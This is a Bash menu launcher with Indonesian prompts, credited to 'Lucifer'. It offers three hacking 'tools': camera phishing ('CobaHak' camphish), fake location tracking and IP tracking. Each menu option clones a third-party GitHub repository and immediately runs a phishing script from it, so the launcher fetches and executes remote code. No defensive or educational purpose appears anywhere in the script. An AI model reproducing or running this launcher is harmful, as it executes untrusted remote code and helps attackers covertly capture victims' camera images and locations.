#!/bin/bash

clear

banner() {
    local user_name=$(whoami)
    local time_now=$(date +"%Y-%m-%d %H:%M:%S")
    local ip_pub=$(curl -s https://api.ipify.org)

    echo -e "\e[1;34m╔════════════════════════════════════════╗\e[0m"
    echo -e "\e[1;34m║           ( T ) ( O ) ( O ) ( L ) ( S )          ║\e[0m"
    echo -e "\e[1;34m╚════════════════════════════════════════╝\e[0m"
    echo ""
    echo -e "\e[1;32mAuthor  : \e[0mLucifer"
    echo -e "\e[1;32mGithub  : \e[0mgithub.com/lucifer"
    echo -e "\e[1;32mWaktu   : \e[0m$time_now"
    echo -e "\e[1;32mUser    : \e[0m$user_name"
    echo -e "\e[1;32mIP Pub  : \e[0m$ip_pub"
    echo ""
    echo -e "\e[1;31mSILAHKAN PILIH TOOLS DIBAWAH\e[0m"
    echo -e "\e[1;33m[1] Kamera (CobaHak)\e[0m"
    echo -e "\e[1;33m[2] Lacak Lokasi (Fake)\e[0m"
    echo -e "\e[1;33m[3] Lacak IP (IP Repo)\e[0m"
    echo ""
}

menu() {
    read -p "Masukkan pilihan [1/2/3]: " option
    option="${option:-1}"

    read -p "Kamu yakin ingin menjalankan pilihan ini? (y/n): " confirm
    if [[ $confirm != [yY] ]]; then
        echo -e "\e[1;91m[!] Dibatalkan oleh user. Keluar...\e[0m"
        exit 0
    fi

    case $option in
        1)
            echo -e "\e[1;92m[*] Mengunduh & menjalankan CobaHak (Kamera)...\e[0m"
            git clone https://github.com/adrian020w/CobaHak.git
            cd CobaHak || exit
            bash camphish.sh
            ;;
        2)
            echo -e "\e[1;92m[*] Mengunduh & menjalankan Fake (Lacak Lokasi)...\e[0m"
            git clone https://github.com/umbrahabreh-arch/fake.git
            cd fake || exit
            bash camphish.sh
            ;;
        3)
            echo -e "\e[1;92m[*] Mengunduh & menjalankan IP Tracker...\e[0m"
            git clone https://github.com/adrian020w/ip.git
            cd ip || exit
            bash cam.sh
            ;;
        *)
            echo -e "\e[1;91m[!] Pilihan tidak valid. Keluar...\e[0m"
            exit 1
            ;;
    esac
}

# Jalankan banner dan menu
banner
menu
